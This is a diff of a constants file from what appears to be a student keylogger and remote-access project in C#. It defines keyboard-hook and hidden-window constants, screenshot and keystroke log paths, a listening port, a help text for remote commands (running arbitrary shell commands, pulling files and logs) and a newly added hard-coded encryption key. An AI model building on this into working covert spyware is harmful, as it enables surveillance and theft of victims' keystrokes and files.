@@ -3,21 +3,28 @@
     public static class Constants
     {
         #region net constants
+
         public static int ListenPort = 7788;
 
         public static int ACK_OK = 0;
         public static int ACK_ERROR = 13;
-        #endregion
+
+        #endregion net constants
 
         #region other constants
+
         public static string ScreenshotPath = @"\screen.jpg";
         public static string LogPath = @"\log.dat";
+        public static string EncryptExtension = @".encr";
+        public static string CryptoKey = "myKey123";//"Vlad is love, baby dont hurt me... Dont hurt me... No more...   Vlad is love, baby dont hurt me... Dont hurt me... No more...   ";
 
         public static int SW_HIDE = 0;
         public static int BUFSIZ = 1024 * 1024;//1024*5000
-        #endregion
+
+        #endregion other constants
 
         #region keyboard constants
+
         public static int WH_KEYBOARD_LL = 13;
         public static int WM_KEYDOWN = 0x0100;
         public static int WM_KEYUP = 0x0101;
@@ -35,9 +42,11 @@
 
         public const string USALang = "США";
         public const string RuLang = "Русская";
-        #endregion
+
+        #endregion keyboard constants
 
         #region reply constants
+
         public static string HelpReply = @"
                                 Cmd syntax: <cmd> <params> <Enter>
                                 Embedded Cmd list:
@@ -45,17 +54,18 @@
                                     log - send log file to client
                                     load path_to_file_without_quotes - load file from server. Dont use quotes even in case of spaces consisting pathes
                                     help - show this message
-                                    cmd <cmd_name> <cmd_arg>* - execute command <cmd_name> on server machine using command shell and reply standart output 
-                                E.g.: 
+                                    cmd <cmd_name> <cmd_arg>* - execute command <cmd_name> on server machine using command shell and reply standart output
+                                E.g.:
                                     cmd taskkill /IM notepad.exe /f
                                     cmd dir
                                     load D:\! 4 сем\KSIS\course\keylogger\client\bin\Debug\log.dat
                                     cmd ipconfig /all
                                     cmd notepad.exe
                                     cmd del path_to_file";
+
         public static string NoCmdProcessReply = "\tCommand process had no reply.\t";
         public static string UnderscoreLine = "___________________________________________________________________________________\r\n";
-        #endregion
-    }
 
+        #endregion reply constants
+    }
 }
